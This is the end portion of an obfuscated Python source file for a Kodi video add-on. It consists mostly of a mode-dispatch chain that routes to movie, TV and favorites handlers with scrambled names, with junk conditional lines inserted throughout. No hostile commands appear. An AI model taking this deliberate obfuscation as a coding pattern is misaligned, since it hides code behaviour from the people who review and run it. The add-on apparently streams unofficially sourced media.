 if 99 - 99: Ooo00oOo00o % O0 . I1I1ii - ii11ii1ii . Oo / I1IiI
elif OOoOoo00Oo == 4009 : i11oO0oOo0 ( )
elif OOoOoo00Oo == 4010 : Ii1II1I11i1 ( )
elif OOoOoo00Oo == 3000 :
 IIiIi11i111II ( )
 if 60 - 60: ii11ii1ii
elif OOoOoo00Oo == 3001 :
 IIiiiiIiI1III ( )
 if 78 - 78: Ooo0OO0oOO + OoOoOO00
elif OOoOoo00Oo == 3002 :
 iIiI ( ooooO0oOoOOoO )
 if 55 - 55: OoooooooOO
elif OOoOoo00Oo == 3003 :
 OO0OOoooo0o ( ooooO0oOoOOoO )
 if 90 - 90: OOOo0
elif OOoOoo00Oo == 3004 :
 iiIIiI11II1 ( ooooO0oOoOOoO )
 if 4 - 4: i11i1 % oOO - i11i1 - OOooOOo
elif OOoOoo00Oo == 404 :
 I1o0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , OOOO0OOO )
 if 30 - 30: iI1Ii11iII1
elif OOoOoo00Oo == 405 :
 I1Iii ( ooooO0oOoOOoO )
 if 34 - 34: Ooo0OO0oOO - OoOoOO00 - OOooOOo + II1i1IiiIIi11 + I1I1ii
elif OOoOoo00Oo == 7030 :
 Iiii ( )
 if 70 - 70: OoooooooOO + Ooo00oOo00o * Oo
elif OOoOoo00Oo == 7021 :
 Oooo ( oO00oooOOoOo0 )
 if 20 - 20: i11iIiiIii - OoOoOO00 - oOO % Ooo0OO0oOO . oOO
elif OOoOoo00Oo == 7022 :
 OO0 ( oO00oooOOoOo0 )
 if 50 - 50: iIii1I11I1II1 + I1I1ii - OOoo0OO0 - OoooooooOO
elif OOoOoo00Oo == 7000 :
 IIIIii11II1I ( oO00oooOOoOo0 , ooooO0oOoOOoO , img )
 if 84 - 84: I1IiI - OOoo0OO0
elif OOoOoo00Oo == 7050 :
 OOOOooO0 ( ooooO0oOoOOoO )
 if 80 - 80: i11iIiiIii % i11i1 - Oo % i11i1
elif OOoOoo00Oo == 7051 :
 Iii1I ( ooooO0oOoOOoO )
 if 89 - 89: oO0O * OOoo0OO0 + I1IiI / i11iIiiIii
elif OOoOoo00Oo == 7052 :
 IIii1i ( ooooO0oOoOOoO )
 if 68 - 68: OoooooooOO * OOoo0OO0
elif OOoOoo00Oo == 7053 :
 o00oo ( ooooO0oOoOOoO )
 if 86 - 86: OOooOOo / I1IiI
elif OOoOoo00Oo == 7054 :
 CoolPlay ( ooooO0oOoOOoO )
 if 40 - 40: II1i1IiiIIi11
elif OOoOoo00Oo == 7060 :
 Ii1111iiI ( )
 if 62 - 62: oOO / i11i1
elif OOoOoo00Oo == 7061 :
 oOOO0o ( ooooO0oOoOOoO )
 if 74 - 74: II1i1IiiIIi11 % I1I1ii / I1I1ii - iIii1I11I1II1 - OoOoOO00 + i11i1
elif OOoOoo00Oo == 7063 :
 I1Io0oO0oo ( ooooO0oOoOOoO )
 if 92 - 92: OOoo0OO0 % I1I1ii
elif OOoOoo00Oo == 7062 :
 ii11Ii1IiiI1 ( ooooO0oOoOOoO )
 if 18 - 18: oOO + I1I1ii / i11i1 / Ooo0OO0oOO + iIii1I11I1II1 % iI1Ii11iII1
elif OOoOoo00Oo == 7064 :
 NATatozcat ( )
 if 94 - 94: OOoo0OO0
elif OOoOoo00Oo == 7067 :
 OoO0o0OO ( ooooO0oOoOOoO )
 if 37 - 37: Ooo0OO0oOO
elif OOoOoo00Oo == 7066 :
 NATatozA ( ooooO0oOoOOoO )
 if 52 - 52: ii11ii1ii * OOOo0 . i11i1 + i1IIi % Ooo0OO0oOO / iIii1I11I1II1
elif OOoOoo00Oo == 7065 :
 II11IiI1 ( ooooO0oOoOOoO )
 if 68 - 68: I1I1ii - I1IiI . i11iIiiIii + OOooOOo
elif OOoOoo00Oo == 7070 :
 oo0O0oOOO0o ( )
 if 71 - 71: i11iIiiIii / i1IIi * OOOo0 / I1IiI
elif OOoOoo00Oo == 7071 :
 DIZIlist ( ooooO0oOoOOoO )
 if 33 - 33: OOoo0OO0 . Oo
elif OOoOoo00Oo == 7072 :
 DIZIpull ( ooooO0oOoOOoO )
 if 89 - 89: II1i1IiiIIi11 + i1IIi - iI1Ii11iII1 + oOO . OoOoOO00
elif OOoOoo00Oo == 7073 :
 WATCHDIZI ( ooooO0oOoOOoO )
 if 85 - 85: iIii1I11I1II1 - oO0O * Oo . Ooo0OO0oOO + I1I1ii
elif OOoOoo00Oo == 7002 :
 Ii11I ( )
 if 13 - 13: O0 + iIii1I11I1II1 % OoOoOO00 + iIii1I11I1II1
elif OOoOoo00Oo == 7003 :
 O0o0oo0O ( ooooO0oOoOOoO )
 if 85 - 85: OOOo0 * iIii1I11I1II1 . II1i1IiiIIi11 / II1i1IiiIIi11
elif OOoOoo00Oo == 7004 :
 I11i1I11 ( ooooO0oOoOOoO )
 if 43 - 43: OOOo0
elif OOoOoo00Oo == 7020 :
 oOiiIIIII ( ooooO0oOoOOoO )
 if 78 - 78: Ooo00oOo00o % OoOoOO00 + I1IiI / OOOo0
elif OOoOoo00Oo == 7001 :
 I1iIIi ( )
 if 34 - 34: OOooOOo % ii11ii1ii + oO0O * OOoo0OO0 / Ooo0OO0oOO
elif OOoOoo00Oo == 7010 :
 oOoOO0O00o ( ooooO0oOoOOoO )
 if 18 - 18: oOO
elif OOoOoo00Oo == 7011 :
 iIIIi1iii1I11 ( ooooO0oOoOOoO )
 if 92 - 92: Ooo00oOo00o % iIii1I11I1II1 / iI1Ii11iII1 * II1i1IiiIIi11 . i1IIi + Ooo0OO0oOO
elif OOoOoo00Oo == 7012 :
 Oo0O0OooOooo0 ( ooooO0oOoOOoO )
 if 24 - 24: iI1Ii11iII1 . II1i1IiiIIi11 * iI1Ii11iII1 % i11iIiiIii . i11iIiiIii + i1IIi
elif OOoOoo00Oo == 7013 :
 cnfTVPlay2 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7014 :
 CNF_Studio_Indexer . MV_Movies ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7015 :
 CNF_Studio_Indexer . Movie_ByYear ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7016 :
 CNF_Studio_Indexer . Resolve_CNF_Link ( oO00oooOOoOo0 , ooooO0oOoOOoO , OOOO0OOO )
elif OOoOoo00Oo == 7017 :
 CNF_Studio_Indexer . Search_Movie ( )
elif OOoOoo00Oo == 7018 :
 O0OOOOoO00oo ( )
elif OOoOoo00Oo == 7019 :
 CNF_Studio_Indexer . List_Movies ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7020 :
 CNF_Studio_Indexer . Get_Movie_Page ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7024 :
 CNF_Studio_Indexer . Box_Office ( ooooO0oOoOOoO )
 if 64 - 64: iIii1I11I1II1 / iI1Ii11iII1 / Oo - ii11ii1ii
elif OOoOoo00Oo == 8000 :
 IiIiiI1ii111 ( )
elif OOoOoo00Oo == 8001 :
 iI1i1I11i ( )
elif OOoOoo00Oo == 8002 :
 II1ii1iI ( )
elif OOoOoo00Oo == 8003 :
 IiiI1i111I1i ( )
elif OOoOoo00Oo == 8004 :
 Ii1IiiiI1ii ( )
elif OOoOoo00Oo == 8005 :
 oo0OooO ( )
elif OOoOoo00Oo == 8006 :
 OO0o0o0oo ( oO00oooOOoOo0 , ooooO0oOoOOoO )
elif OOoOoo00Oo == 8030 :
 OOo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8045 :
 I1iI11I ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8046 :
 Oo0oOO ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8047 :
 iiiIi ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8020 :
 iIi1iI ( )
elif OOoOoo00Oo == 8021 :
 i11ii ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8022 :
 IiI111I ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8023 :
 oo0oO0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8040 :
 iI1ii ( )
elif OOoOoo00Oo == 8041 :
 O0OooOO ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8042 :
 III1IiI1i1i ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8043 :
 yt . PlayVideo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8044 :
 o0OOOOOo0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8060 :
 Ii1iiI1 ( )
elif OOoOoo00Oo == 8061 :
 o0ooOOoO0oO0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8064 :
 OOoO0OOoO0ooo ( )
elif OOoOoo00Oo == 8065 :
 ii11i1ii1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8070 :
 iI1i ( )
elif OOoOoo00Oo == 8071 :
 i11I ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7080 :
 o0oO0o0oo0O0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8090 :
 oo00ooooOOo00 ( )
elif OOoOoo00Oo == 8091 :
 ii1i ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8092 :
 OO00Oooo000 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8081 :
 i1I1I1I ( )
elif OOoOoo00Oo == 8062 :
 iIiO0O ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8063 :
 I11OOO0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8050 :
 II1I11IIi ( )
elif OOoOoo00Oo == 8051 :
 OoOOo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8052 :
 iii1oOO0oo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8085 :
 Ii1Ii1 ( )
elif OOoOoo00Oo == 8086 :
 IIi11iI1Iii ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8087 :
 iI1IIIII1Ii ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 8088 :
 iIiI1I1IiII1I1i1I1 ( ooooO0oOoOOoO , oO00oooOOoOo0 )
elif OOoOoo00Oo == 9000 :
 OO00 ( )
elif OOoOoo00Oo == 1111 :
 o0Oo ( )
elif OOoOoo00Oo == 9001 :
 oOO0 ( )
elif OOoOoo00Oo == 9002 :
 OOOo0oO ( )
elif OOoOoo00Oo == 9003 :
 oOOO000o0O0O ( )
elif OOoOoo00Oo == 50 :
 iiiii1IIII ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 9020 :
 champlist ( )
elif OOoOoo00Oo == 9021 :
 iiiIIiii11I1 ( )
elif OOoOoo00Oo == 9022 :
 oo0OOoooo0O0 ( )
elif OOoOoo00Oo == 9023 :
 oOoO000 ( )
elif OOoOoo00Oo == 9024 :
 O0o0O0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 9030 :
 OooOoo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 9031 :
 Oooo0Oo00o ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 9032 :
 IIoO ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 9033 :
 iI1I ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7085 :
 iiiIIiiIi ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7086 :
 iI1II1i ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 7087 :
 IIIIIiI1I1 ( Iiii1iI1i )
elif OOoOoo00Oo == 9666 :
 oO0OOOO00o ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10100 : iiI1ii111 ( )
elif OOoOoo00Oo == 10105 : I1111ii11IIII ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10106 : iI1Iii11i1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10104 : iIIIII1iI ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10107 : IiIIii1iiI ( )
elif OOoOoo00Oo == 10103 : i1IiI1Iiii ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10108 : I11II1i1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10107 : IiIIii1iiI ( )
elif OOoOoo00Oo == 10000 : Origin_Menu ( )
elif OOoOoo00Oo == 10001 : oo0O ( )
elif OOoOoo00Oo == 10002 : iII1i1IIiI1I ( )
elif OOoOoo00Oo == 10003 : ooOoOO ( )
elif OOoOoo00Oo == 10004 : O00oOoo0OoO0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10005 : I1iiIII ( )
elif OOoOoo00Oo == 10006 : i11i1Ii1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10007 : OO00OO0o0 ( ooooO0oOoOOoO , OOOO0OOO )
elif OOoOoo00Oo == 10008 : o0iIIIIi ( )
elif OOoOoo00Oo == 10009 : iIII11Iiii1 ( )
elif OOoOoo00Oo == 10010 : o0OoO0OOoO0Oo0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10011 : IiiI11I1IIiI ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10012 : o00OOo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10013 : oOoO0OOO00O ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10014 : Ooi11III1II1 ( )
elif OOoOoo00Oo == 10015 : OOo0O0O000 ( )
elif OOoOoo00Oo == 10016 : i1iii11 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10017 : oO0ooOO ( )
elif OOoOoo00Oo == 10018 : iIi11i ( )
elif OOoOoo00Oo == 10019 : oOO0OO0oOO ( )
elif OOoOoo00Oo == 10020 : iiiii1I1III1 ( )
elif OOoOoo00Oo == 10021 : i1I1i ( )
elif OOoOoo00Oo == 10022 : ooo0O0o0OoOO ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10023 : oOOoO ( oO00oooOOoOo0 , ooooO0oOoOOoO )
elif OOoOoo00Oo == 10024 : iiiO0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10025 : ooo0oo ( )
elif OOoOoo00Oo == 10026 : iIii11iI1II ( )
elif OOoOoo00Oo == 10027 : IiIi1III ( )
elif OOoOoo00Oo == 10028 : oO0O0oO0 ( )
elif OOoOoo00Oo == 10029 : OOOoo0ooOo00O ( )
elif OOoOoo00Oo == 423 : O0o0O0OO0o ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 426 : I1I11IiiI ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10030 : Izle_Films ( )
elif OOoOoo00Oo == 10031 : Latest_Izle_Movies ( )
elif OOoOoo00Oo == 10032 : Izle_Genres ( )
elif OOoOoo00Oo == 10033 : Izle_Pop_Movies ( )
elif OOoOoo00Oo == 10034 : Izle_Boxsets ( )
elif OOoOoo00Oo == 10035 : Izle_Search ( )
elif OOoOoo00Oo == 10036 : Izle_Genres_Movie ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10037 : Izle_Boxset_single ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10038 : Izle_IFRAME ( )
elif OOoOoo00Oo == 10039 : Izle_Boxsets_Next ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10040 : ii1iIi1Ii1 ( )
elif OOoOoo00Oo == 10041 : i11i11II11i ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10042 : iiO0o0O0oo0o ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10043 : Iiii111 ( )
elif OOoOoo00Oo == 10044 : OOooOooo0OOo0 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10045 : III1III11II ( oO00oooOOoOo0 )
elif OOoOoo00Oo == 10046 : o0o ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10047 : O0000oO0o00 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10048 : O00O ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10049 : oO0o0o00oOo0O ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10050 : iIIi1 ( )
elif OOoOoo00Oo == 10051 : iIiiIiIIiI ( )
elif OOoOoo00Oo == 10052 : o0000oO ( )
elif OOoOoo00Oo == 10053 : Addon ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10054 : IIiII ( ooooO0oOoOOoO , oO00oooOOoOo0 )
elif OOoOoo00Oo == 10055 :
 Oo00ooO0OoOo ( "addFavorite" )
 try :
  oO00oooOOoOo0 = oO00oooOOoOo0 . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  oO00oooOOoOo0 = oO00oooOOoOo0 . split ( '  - ' ) [ 0 ]
 except :
  pass
 oO00OoOo ( oO00oooOOoOo0 , ooooO0oOoOOoO , OOOO0OOO , i1i1ii , I1IIII )
elif OOoOoo00Oo == 10056 :
 Oo00ooO0OoOo ( "rmFavorite" )
 try :
  oO00oooOOoOo0 = oO00oooOOoOo0 . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  oO00oooOOoOo0 = oO00oooOOoOo0 . split ( '  - ' ) [ 0 ]
 except :
  pass
 iii ( oO00oooOOoOo0 )
elif OOoOoo00Oo == 10057 :
 Oo00ooO0OoOo ( "getFavorites" )
 IiI1O0oO ( )
elif OOoOoo00Oo == 10058 : ooO ( )
elif OOoOoo00Oo == 10059 : Donators_Guide ( )
elif OOoOoo00Oo == 10060 : iIi1i1iIi1iI ( )
elif OOoOoo00Oo == 10061 : IIIii1 ( )
elif OOoOoo00Oo == 10062 : OO0oOOoo ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
elif OOoOoo00Oo == 10063 : iiIi1i ( )
elif OOoOoo00Oo == 10064 : o0o0O ( )
elif OOoOoo00Oo == 10065 : OOooo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10066 : III11I1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10068 : Ii ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10069 : II11iIIiiiII ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10070 : iI1II ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10071 : Genie_Watch ( )
elif OOoOoo00Oo == 10072 : OooOo0ooo ( )
elif OOoOoo00Oo == 10073 : I1II1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10074 : oo00OO0000oO ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10075 : Ii1iI111II1I1 ( OOOO0OOO , oO00oooOOoOo0 , ooooO0oOoOOoO )
elif OOoOoo00Oo == 10076 : IiI1iiiIii ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10077 : i1i1iI1iiiI ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10078 : iI1111ii1I ( )
elif OOoOoo00Oo == 10079 : Genie_Watch_Tv_Shows ( )
elif OOoOoo00Oo == 10080 : Genie_Watch_Tv_Genre ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10081 : Genie_Watch_TV_PlayRun ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10082 : Genie_Watch_TV_Episodes ( ooooO0oOoOOoO , OOOO0OOO )
elif OOoOoo00Oo == 10083 : Genie_Watch_Tv_Recent ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 10084 : I1Ii ( )
elif OOoOoo00Oo == 10085 : i1i ( )
elif OOoOoo00Oo == 10086 : OO00Oo ( )
elif OOoOoo00Oo == 20000 : i1i1 ( )
elif OOoOoo00Oo == 20001 : iiIIi1 ( )
elif OOoOoo00Oo == 20002 : O0Oo0Ooo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 20003 : O0iI ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 20004 : iI1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 21004 : o0OooooOoOO ( )
elif OOoOoo00Oo == 21005 : i1i1IIIIIIIi ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 21006 : OO0oOOo0o ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 21007 : iiI1I1IIi11i1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30000 : I111I11I111 ( )
elif OOoOoo00Oo == 30001 : ooO00O00oOO ( )
elif OOoOoo00Oo == 10012 : Resolve ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30003 : oOOII1i11i1iIi11 ( )
elif OOoOoo00Oo == 30004 : oo00ooOoo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30005 : iIIIiiiI11I ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30006 : iIiI1iiiI1ii ( )
elif OOoOoo00Oo == 30007 : OO00o ( )
elif OOoOoo00Oo == 30008 : iiiII ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30009 : OOOo ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30010 : iIiI1 ( ooooO0oOoOOoO )
elif OOoOoo00Oo == 30011 : o0o000 ( )
elif OOoOoo00Oo == 30012 : iii11II1I ( )
elif OOoOoo00Oo == 30013 : II1iiIiIiI ( )
elif OOoOoo00Oo == 30014 : o0O0ooOOoO ( )
if 100 - 100: iI1Ii11iII1 + i1IIi * Ooo00oOo00o
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
